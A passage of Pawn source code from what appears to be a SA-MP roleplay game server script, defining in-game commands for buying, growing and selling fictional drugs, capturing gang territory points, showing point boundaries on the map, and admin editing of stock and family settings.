		price = amount * tel;
		if(Points[mypoint][Stock] < amount) return SendClientMessage(playerid, COLOR_GREY, "   This Crack Lab doesn't have that much crack!");
		if(GetPlayerCash(playerid) > price)
		{
			format(string, sizeof(string), "* You bought %d grams for $%d.", amount, price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, -price);
			PlayerInfo[playerid][pCrack] += amount;

			//if(PlayerInfo[playerid][pVip] < 1) Points[mypoint][Stock] = Points[mypoint][Stock]-amount;
			Points[mypoint][Stock] = Points[mypoint][Stock]-amount;

			format(string, sizeof(string), " CRACK AVAILABLE: %d grams.", Points[mypoint][Stock]);
			UpdateDynamic3DTextLabelText(Points[mypoint][TextLabel], COLOR_YELLOW, string);
			for(new i = 0; i < sizeof(FamilyInfo); i++)
			{
				if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
				{
					FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+price/2;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   You cant afford the Drugs!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not a drug dealer.");
		return 1;
	}
	return 1;
}

CMD:getseeds(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] != 4 && PlayerInfo[playerid][pJob2] != 4)
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not a drug dealer.");
		return 1;
	}
	if(PlayerInfo[playerid][pWSeeds] > 0)
	{
	    SendClientMessage(playerid, COLOR_GREY, "You already have a bag of seeds, use them first.");
	    return 1;
	}
	if(GetPlayerCash(playerid) < 1000)
	{
	    SendClientMessage(playerid, COLOR_GREY, " You do not have $1000.");
	    return 1;
	}
	new mypoint = -1;
	for (new i=0; i<MAX_POINTS; i++)
  	{
	   	if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && Points[i][Type] == 3)
	   	{
			mypoint = i;
		}
   	}
   	if(mypoint == -1)
   	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at the Drug House!");
		return 1;
   	}
	if(Points[mypoint][Stock] < 1) return SendClientMessage(playerid, COLOR_GREY, "   This drug house doesn't have any seeds.");

	new string[32];
	Points[mypoint][Stock] -= 1;
	format(string, sizeof(string), " POT AVAILABLE: %d grams.", Points[mypoint][Stock]);
	UpdateDynamic3DTextLabelText(Points[mypoint][TextLabel], COLOR_YELLOW, string);

	PlayerInfo[playerid][pWSeeds] += 3;
	SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have purchased a bag of Pot Seeds from the Drug House. ");
	GivePlayerCash(playerid, -1000);
	GameTextForPlayer(playerid, "~r~-$1000", 3000, 1);
	for(new i = 0; i < sizeof(FamilyInfo); i++)
	{
		if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
		{
			FamilyInfo[i][FamilyBank] += 500;
		}
	}
	return 1;
}

CMD:plantseeds(playerid, params[]) {
	if(PlayerInfo[playerid][pJob] != 4 && PlayerInfo[playerid][pJob2] != 4) {
		SendClientMessage(playerid, COLOR_GREY, "   You're not a drug dealer.");
	}
 	else if(PlayerInfo[playerid][pWSeeds] > 0) {
		if(IsValidDynamicObject(PlayerInfo[playerid][pWeedObject]))
		    return SendClientMessage(playerid, COLOR_GRAD2, "You already have a plant growing.");

		if(IsPlayerInAnyVehicle(playerid))
		    return SendClientMessage(playerid, COLOR_GREY, "You can't plant while in a vehicle.");

		new
			szMessage[48];

		GetPlayerPos(playerid, PlayerInfo[playerid][pWeedPos][0], PlayerInfo[playerid][pWeedPos][1], PlayerInfo[playerid][pWeedPos][2]);
		PlayerInfo[playerid][pWeedPos][2] -= 1.5;

        ApplyAnimation(playerid,"BOMBER","BOM_Plant_Crouch_In", 4.0, 0, 0, 0, 0, 0, 1);
		SendClientMessage(playerid, COLOR_GREEN, "You have planted some weed. It will take around 20-45 minutes to grow.");

		PlayerInfo[playerid][pWeedInt] = GetPlayerInterior(playerid);
		PlayerInfo[playerid][pWeedVW] = GetPlayerVirtualWorld(playerid);
		PlayerInfo[playerid][pWeedGrowth] = 0;
		PlayerInfo[playerid][pWSeeds]--;
		PlayerInfo[playerid][pWeedObject] = CreateDynamicObject(3409, PlayerInfo[playerid][pWeedPos][0], PlayerInfo[playerid][pWeedPos][1], PlayerInfo[playerid][pWeedPos][2], 0.0, 0.0, 0.0, PlayerInfo[playerid][pWeedVW], PlayerInfo[playerid][pWeedInt]);
		format(szMessage, sizeof(szMessage), "* %s plants some weed.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}
	else SendClientMessage(playerid, COLOR_GREY, "You don't have enough seeds to plant weed - head to the drug house and pick up some seeds (/getseeds).");
	return 1;
}

CMD:checkweed(playerid, params[]) {
	if(IsValidDynamicObject(PlayerInfo[playerid][pWeedObject]) && GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pWeedVW] && GetPlayerInterior(playerid) == PlayerInfo[playerid][pWeedInt]) {
	    if(IsPlayerInRangeOfPoint(playerid, 4, PlayerInfo[playerid][pWeedPos][0], PlayerInfo[playerid][pWeedPos][1], PlayerInfo[playerid][pWeedPos][2])) {
			if(PlayerInfo[playerid][pWeedGrowth] > 10) {

				new
					szMessage[66 + MAX_PLAYER_NAME];

				format(szMessage, sizeof(szMessage), "Your plant currently carries %i grams - use /pickweed to claim it.", PlayerInfo[playerid][pWeedGrowth]);
				SendClientMessage(playerid, COLOR_WHITE, szMessage);
			}
			else SendClientMessage(playerid, COLOR_YELLOW, "Your plant isn't ready to be picked yet.");
			return 1;
		}
	}
	foreach(Player, i) if(IsValidDynamicObject(PlayerInfo[i][pWeedObject]) && GetPlayerVirtualWorld(playerid) == PlayerInfo[i][pWeedVW] && GetPlayerInterior(playerid) == PlayerInfo[i][pWeedInt]) {
	    if(IsPlayerInRangeOfPoint(playerid, 4, PlayerInfo[i][pWeedPos][0], PlayerInfo[i][pWeedPos][1], PlayerInfo[i][pWeedPos][2])) {
			if(PlayerInfo[i][pWeedGrowth] > 10) {

				new
					szMessage[66 + MAX_PLAYER_NAME];

				format(szMessage, sizeof(szMessage), "This plant currently carries %i grams - use /pickweed to claim it.", PlayerInfo[i][pWeedGrowth]);
				SendClientMessage(playerid, COLOR_WHITE, szMessage);
			}
			else SendClientMessage(playerid, COLOR_YELLOW, "This plant isn't ready to be picked yet.");
			return 1;
		}
	}
	return SendClientMessage(playerid, COLOR_GREY, "You're not at a plant.");
}

CMD:pickweed(playerid, params[]) {
	foreach(Player, i) if(IsValidDynamicObject(PlayerInfo[i][pWeedObject]) && IsPlayerInRangeOfPoint(playerid, 4, PlayerInfo[i][pWeedPos][0], PlayerInfo[i][pWeedPos][1], PlayerInfo[i][pWeedPos][2])) {
	    if(GetPlayerVirtualWorld(playerid) == PlayerInfo[i][pWeedVW] && GetPlayerInterior(playerid) == PlayerInfo[i][pWeedInt]) {
			if(PlayerInfo[i][pWeedGrowth] > 10) {
				if(PlayerInfo[i][pWeedGrowth] + PlayerInfo[playerid][pPot] < 99) {

					new
						szMessage[52];

					ApplyAnimation(playerid,"BOMBER","BOM_Plant_Crouch_Out", 4.0, 0, 0, 0, 0, 0, 1);
					PlayerInfo[playerid][pPot] += PlayerInfo[i][pWeedGrowth];
					format(szMessage, sizeof(szMessage), "You picked the plant and gathered %d grams of pot.", PlayerInfo[i][pWeedGrowth]);
					SendClientMessage(playerid, COLOR_GREY, szMessage);
					format(szMessage, sizeof(szMessage), "* %s picks the weed plant.", GetPlayerNameEx(playerid));
					ProxDetector(25.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					DestroyDynamicObject(PlayerInfo[i][pWeedObject]);
					PlayerInfo[i][pWeedObject] = 0;
					return 1;
				}
				else SendClientMessage(playerid, COLOR_GREY, "You can't carry more then 99 grams of pot.");
			}
			else SendClientMessage(playerid, COLOR_GREY, "This plant is not ready to be picked yet.");
			return 1;
		}
	}
	return SendClientMessage(playerid, COLOR_GREY, "You're not at a plant.");
}

CMD:sellpot(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(PlayerInfo[playerid][pJob] != 4 && PlayerInfo[playerid][pJob2] != 4)
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not a drug dealer.");
		return 1;
	}
	if(PlayerInfo[playerid][pDrugsTime] != 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You must wait 1 minute before selling more drugs.");
		return 1;
	}

	new string[128], giveplayerid, needed, money;
	if(sscanf(params, "udd", giveplayerid, needed, money)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sellpot [playerid/partofname] [amount] [price]");

	if(needed < 1 || needed > 99) { SendClientMessage(playerid, COLOR_GREY, "   Grams no lower then 1, or above 99!"); return 1; }
	if(money < 1 || money > 99999) { SendClientMessage(playerid, COLOR_GREY, "   Price not lower then 1, or above 99999!"); return 1; }
	if(needed > PlayerInfo[playerid][pPot]) { SendClientMessage(playerid, COLOR_GREY, "   You Don't have that much Pot with you!"); return 1; }
	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			if(ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(giveplayerid == playerid)
				{
					SendClientMessage(playerid, COLOR_GREY, "   Cant sell to yourself!");
					return 1;
				}
				format(string, sizeof(string), "* You offered %s to buy %d gram(s) of Pot for $%d.", GetPlayerNameEx(giveplayerid), needed, money);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Drug Dealer %s wants to sell you %d gram(s) for $%d, (type /accept pot) to buy.", GetPlayerNameEx(playerid), needed, money);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pDrugsTime] = 60;
				PotOffer[giveplayerid] = playerid;
				PotPrice[giveplayerid] = money;
				PotGram[giveplayerid] = needed;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "That player is not connected.");
	}
	return 1;
}

CMD:sellcrack(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(PlayerInfo[playerid][pJob] != 4 && PlayerInfo[playerid][pJob2] != 4)
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not a drug dealer.");
		return 1;
	}
	if(PlayerInfo[playerid][pDrugsTime] != 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You must wait 1 minute before selling more drugs.");
		return 1;
	}

	new string[128], giveplayerid, needed, money;
	if(sscanf(params, "udd", giveplayerid, needed, money)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sellcrack [playerid/partofname] [amount] [price]");

	if(needed < 1 || needed > 99) { SendClientMessage(playerid, COLOR_GREY, "   Grams no lower then 1, or above 99!"); return 1; }
	if(money < 1 || money > 99999) { SendClientMessage(playerid, COLOR_GREY, "   Price not lower then 1, or above 99999!"); return 1; }
	if(needed > PlayerInfo[playerid][pCrack]) { SendClientMessage(playerid, COLOR_GREY, "   You Don't have that much Crack with you!"); return 1; }
	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			if(ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(giveplayerid == playerid)
				{
					SendClientMessage(playerid, COLOR_GREY, "   Cant sell to yourself!");
					return 1;
				}
				format(string, sizeof(string), "* You offered %s to buy %d gram(s) of Crack for $%d.", GetPlayerNameEx(giveplayerid), needed, money);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Drug Dealer %s wants to sell you %d gram(s) for $%d, (type /accept crack) to buy.", GetPlayerNameEx(playerid), needed, money);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pDrugsTime] = 60;
				CrackOffer[giveplayerid] = playerid;
				CrackPrice[giveplayerid] = money;
				CrackGram[giveplayerid] = needed;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "That player is not connected.");
	}
	return 1;
}

CMD:dedit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   	}

	new string[128], choice[32], amount;
	if(sscanf(params, "s[32]d", choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /dedit [name] [amount]");
		SendClientMessage(playerid, COLOR_GREY, "Available names: Pot, Crack");
		return 1;
	}

	if(strcmp(choice,"pot",true) == 0)
	{
		for(new h = 0; h < sizeof(Points); h++)
		{
			if(Points[h][Type] == 3)
			{
				Points[h][Stock] = amount;
				format(string, sizeof(string), " POT AVAILABLE: %d grams.", Points[h][Stock]);
				UpdateDynamic3DTextLabelText(Points[h][TextLabel], COLOR_YELLOW, string);
				SendClientMessage(playerid, COLOR_WHITE, " You have successfully changed the Drug House available pot!");
			}
		}
	}
	else if(strcmp(choice,"crack",true) == 0)
	{
		for(new h = 0; h < sizeof(Points); h++)
		{
			if(Points[h][Type] == 4)
			{
				Points[h][Stock] = amount;
				format(string, sizeof(string), " CRACK AVAILABLE: %d grams.", Points[h][Stock]);
				UpdateDynamic3DTextLabelText(Points[h][TextLabel], COLOR_YELLOW, string);
				SendClientMessage(playerid, COLOR_WHITE, " You have successfully changed the Crack Lab available crack!");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "	Not a valid name.");
		return 1;
	}
	return 1;
}

CMD:adestroyplant(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 		{
  			SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
   		}

		new
			iTargetID;

		if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /adestroyplant [playerid/partofname]");
		}
		else if(IsPlayerConnected(iTargetID)) {

			new
				szMessage[47 + MAX_PLAYER_NAME];

			format(szMessage, sizeof(szMessage), "You have destroyed %s's weed plant (%i grams).", GetPlayerNameEx(iTargetID), PlayerInfo[iTargetID][pWeedGrowth]);
			SendClientMessage(playerid, COLOR_GREY, szMessage);

			format(szMessage, sizeof(szMessage), "Admin %s has destroyed your weed plant (%i grams).", GetPlayerNameEx(playerid), PlayerInfo[iTargetID][pWeedGrowth]);
			SendClientMessage(iTargetID, COLOR_GREY, szMessage);

			if(IsValidDynamicObject(PlayerInfo[playerid][pWeedObject])) {
				DestroyDynamicObject(PlayerInfo[playerid][pWeedObject]);
				PlayerInfo[playerid][pWeedObject] = 0;
			}
		}
		else SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
	}
	else SendClientMessage(playerid, COLOR_GREY, "You're not authorized to use this command.");
	return 1;
}

CMD:capture(playerid, params[])
{
	new string[128];

	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	new mypoint = -1;
	if(GetPVarInt(playerid,"Injured") == 1)
		return SendClientMessage(playerid, COLOR_GRAD1, " You can't capture while injured!");

	if(PlayerInfo[playerid][pGang] == 255)
		return SendClientMessage(playerid, COLOR_GRAD2, "You're not a part of a Family!");

	if(PlayerInfo[playerid][pRank] < 5)
		return SendClientMessage(playerid, COLOR_GRAD1, "You're not high rank enough to capture!");

	for (new i=0; i<MAX_POINTS; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 1.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz])) mypoint = i;
	}

	if(mypoint == -1)
		return SendClientMessage(playerid, COLOR_GRAD1, "You're not at the capture place!");

	if(Points[mypoint][Vulnerable] > 0 || Points[mypoint][Vulnerable] == -1)
		return SendClientMessage(playerid, COLOR_GRAD1, " This point is not ready for takeover.");

	if(Points[mypoint][TimeToClaim])
		return SendClientMessage(playerid, COLOR_GRAD1, " This point is already being captured!");

	Points[mypoint][PointBarID] = CreateProgressBar(258.00, 137.00, 131.50, 3.19, COLOR_GREEN, 100.0);
	SetProgressBarValue(Points[mypoint][PointBarID], 100.0);
	ShowProgressBarForPlayer(playerid, Points[mypoint][PointBarID]);
	format(string,sizeof(string), " %s is attempting to capture the point.", GetPlayerNameEx(playerid));
	ProxDetector(70.0, playerid, string, COLOR_RED,COLOR_RED,COLOR_RED,COLOR_RED,COLOR_RED);
	GetPlayerPos(playerid, Points[mypoint][Capturex], Points[mypoint][Capturey], Points[mypoint][Capturez]);

	Points[mypoint][ClaimerId] = playerid;
	Points[mypoint][TimeToClaim] = 1;
	Points[mypoint][TimeLeft] = 10;
	SetTimerEx("ProgressTimer", 1000, 0, "d", mypoint);
	return 1;
}

CMD:pbounds(playerid, params[])
{
	if(isnull(params))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /pbounds [point]");
		SendClientMessage(playerid, COLOR_WHITE, "HINT: This will indicate the point boundaries for a point.");
		SendClientMessage(playerid, COLOR_GRAD3, "Points: FFC (Fossil Fuel Company) | MP1 (Materials Pickup 1) | DF (Drug Factory)");
		SendClientMessage(playerid, COLOR_GRAD3, "Points: MF1 (Materials Factory 1) | DH (Drug House) | MP2 (Materials Pickup 2)");
		SendClientMessage(playerid, COLOR_GRAD3, "Points: CL (Crack Lab) | MF2 (Materials Factory 2) | AEC (Auto Export Company)");
		return 1;
	}

	if(strcmp(params,"ffc",true) == 0)
	{
	    if(IsBoundsShowingFFC[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[0], 0xFF00008C); // FFC
			IsBoundsShowingFFC[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Fossil Fuel Company are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[0]); // FFC
			IsBoundsShowingFFC[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Fossil Fuel Company are now removed from your radar and map.");
		}
	}
	else if(strcmp(params,"mp1",true) == 0)
	{
	    if(IsBoundsShowingMP1[playerid] == 0)
		{
			GangZoneShowForPlayer(playerid, pointboundaries[1], 0xFF00008C); // MP1
			IsBoundsShowingMP1[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Pickup 1 are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[1]); // MP1
			IsBoundsShowingMP1[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Pickup 1 are now removed from your radar and map.");
		}
	}
	else if(strcmp(params,"df",true) == 0)
	{
	    if(IsBoundsShowingDF[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[8], 0xFF00008C); // DF
			IsBoundsShowingDF[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Drug Factory are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[8]); // DF
			IsBoundsShowingDF[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Drug Factory are now removed from your radar and map.");
		}
	}
	else if(strcmp(params,"mf1",true) == 0)
	{
	    if(IsBoundsShowingMF1[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[2], 0xFF00008C); // MF1
			IsBoundsShowingMF1[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Factory 1 are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[2]); // MF1
			IsBoundsShowingMF1[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Factory 1 are now removed from your radar and map.");
		}
	}
	else if(strcmp(params,"dh",true) == 0)
	{
	    if(IsBoundsShowingDH[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[6], 0xFF00008C); // DH
			IsBoundsShowingDH[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Drug House are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[6]); // DH
			IsBoundsShowingDH[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Drug House are now removed from your radar and map.");
		}
	}
	else if(strcmp(params,"mp2",true) == 0)
	{
	    if(IsBoundsShowingMP2[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[3], 0xFF00008C); // MP2
			IsBoundsShowingMP2[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Pickup 2 are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[3]); // MP2
			IsBoundsShowingMP2[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Pickup 2 are now from your radar and map.");
		}
	}
	else if(strcmp(params,"cl",true) == 0)
	{
	    if(IsBoundsShowingCL[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[7], 0xFF00008C); // CL
			IsBoundsShowingCL[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Crack Lab are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[7]); // CL
			IsBoundsShowingCL[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Crack Lab are now removed from your radar and map.");
		}
	}
	else if(strcmp(params,"mf2",true) == 0)
	{
	    if(IsBoundsShowingMF2[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[4], 0xFF00008C); // MF2
			IsBoundsShowingMF2[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Factory 2 are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[4]); // MF2
			IsBoundsShowingMF2[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Factory 2 are now indicated on your radar and map in red.");
		}
	}
	else if(strcmp(params,"aec",true) == 0)
	{
	    if(IsBoundsShowingAEC[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[5], 0xFF00008C); // AEC
			IsBoundsShowingAEC[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Auto Export Company are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[5]); // AEC
			IsBoundsShowingAEC[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Auto Export Company are now removed from your radar and map");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Invalid point entered.");
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /pbounds [point]");
		SendClientMessage(playerid, COLOR_WHITE, "HINT: This will indicate the point boundaries for a point.");
		SendClientMessage(playerid, COLOR_GRAD3, "Points: FFC (Fossil Fuel Company) | MP1 (Materials Pickup 1) | DF (Drug Factory)");
		SendClientMessage(playerid, COLOR_GRAD3, "Points: MF1 (Materials Factory 1) | DH (Drug House) | MP2 (Materials Pickup 2)");
		SendClientMessage(playerid, COLOR_GRAD3, "Points: CL (Crack Lab) | MF2 (Materials Factory 2) | AEC (Auto Export Company)");
	}
	return 1;
}

CMD:pboundsoff(playerid, params[])
{
	GangZoneHideForPlayer(playerid, pointboundaries[0]); // FFC
	GangZoneHideForPlayer(playerid, pointboundaries[1]); // MP1
	GangZoneHideForPlayer(playerid, pointboundaries[2]); // MF1
	GangZoneHideForPlayer(playerid, pointboundaries[3]); // MP2
	GangZoneHideForPlayer(playerid, pointboundaries[4]); // MF2
	GangZoneHideForPlayer(playerid, pointboundaries[5]); // AEC
	GangZoneHideForPlayer(playerid, pointboundaries[6]); // DH
	GangZoneHideForPlayer(playerid, pointboundaries[7]); // CL
	GangZoneHideForPlayer(playerid, pointboundaries[8]); // DF
	IsBoundsShowingFFC[playerid] = 0;
	IsBoundsShowingMP1[playerid] = 0;
	IsBoundsShowingMF1[playerid] = 0;
	IsBoundsShowingMP2[playerid] = 0;
	IsBoundsShowingMF2[playerid] = 0;
	IsBoundsShowingAEC[playerid] = 0;
	IsBoundsShowingDH[playerid] = 0;
	IsBoundsShowingCL[playerid] = 0;
	IsBoundsShowingDF[playerid] = 0;
 	SendClientMessage(playerid, COLOR_WHITE, "All point boundaries removed from your radar and map.");
	return 1;
}

CMD:points(playerid, params[])
{
	new string[128];

	for(new i; i < MAX_POINTS; i++)
	{
		if(Points[i][Type] >= 0)
		{
		    if(Points[i][Vulnerable] == -1)
		    {
		        format(string, sizeof(string), "Name: %s | Owner: %s | Captured By: %s | Hours: Temporarily disabled", Points[i][Name],Points[i][Owner],Points[i][CapperName]);
		    }
		    else
		    {
				format(string, sizeof(string), "Name: %s | Owner: %s | Captured By: %s | Hours: %d", Points[i][Name],Points[i][Owner],Points[i][CapperName],Points[i][Vulnerable]);
			}
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	return 1;
}

CMD:fedit(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pGangMod] > 0 || PlayerInfo[playerid][pAdmin] >= 4) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  			return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new family, x_job[64], x_hq[64], ammount, string[128];
		if(sscanf(params, "is[64]s[64]", family, x_job, x_hq))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fedit [family] [name] [amount]");
			SendClientMessage(playerid, COLOR_GREY, "Available names: Leader, MaxSkins, Skin1, Skin2, Skin3, Skin4, Skin5, Skin6, Skin7, Skin8");
			return 1;
		}
        ammount = strval(x_hq);
		if(family < 1 || family > MAX_FAMILY) { SendClientMessage(playerid, COLOR_GREY, "   FamilyNr can't be below 1 or above 14!"); return 1; }
		family -= 1;

		if(strcmp(x_job,"leader",true) == 0)
		{
			if(strlen(x_hq) >= 20)
			{
				SendClientMessage(playerid, COLOR_GRAD1, "That leader name is too long, please refrain from using more than 20 characters.");
				return 1;
			}
			strcpy(FamilyInfo[family][FamilyLeader], x_hq, MAX_PLAYER_NAME);
			format(string, sizeof(string), "You have changed '%s' leader name to %s.", FamilyInfo[family][FamilyName], x_hq);
			SendClientMessage(playerid, COLOR_WHITE, string);
			SaveFamilies();
			return 1;
		}
		else if(strcmp(x_job,"maxskins",true) == 0)
		{
			if(ammount > 8) return SendClientMessage(playerid, COLOR_WHITE, "You can't set the maxskins more than 8.");
			if(ammount == 7)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
			}
			if(ammount == 6)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
			}
			if(ammount == 5)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
				FamilyInfo[family][FamilySkins][5] = 0;
			}
			if(ammount == 4)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
				FamilyInfo[family][FamilySkins][5] = 0;
				FamilyInfo[family][FamilySkins][4] = 0;
			}
			if(ammount == 3)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
				FamilyInfo[family][FamilySkins][5] = 0;
				FamilyInfo[family][FamilySkins][4] = 0;
				FamilyInfo[family][FamilySkins][3] = 0;
			}
			if(ammount == 2)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
				FamilyInfo[family][FamilySkins][5] = 0;
				FamilyInfo[family][FamilySkins][4] = 0;
				FamilyInfo[family][FamilySkins][3] = 0;
				FamilyInfo[family][FamilySkins][2] = 0;
			}

			if(ammount == 1)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
				FamilyInfo[family][FamilySkins][5] = 0;
				FamilyInfo[family][FamilySkins][4] = 0;
				FamilyInfo[family][FamilySkins][3] = 0;
				FamilyInfo[family][FamilySkins][2] = 0;
				FamilyInfo[family][FamilySkins][1] = 0;
			}
			if(ammount == 0)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
				FamilyInfo[family][FamilySkins][5] = 0;
				FamilyInfo[family][FamilySkins][4] = 0;
				FamilyInfo[family][FamilySkins][3] = 0;
				FamilyInfo[family][FamilySkins][2] = 0;
				FamilyInfo[family][FamilySkins][1] = 0;
				FamilyInfo[family][FamilySkins][0] = 0;
			}

			FamilyInfo[family][FamilyMaxSkins] = ammount;
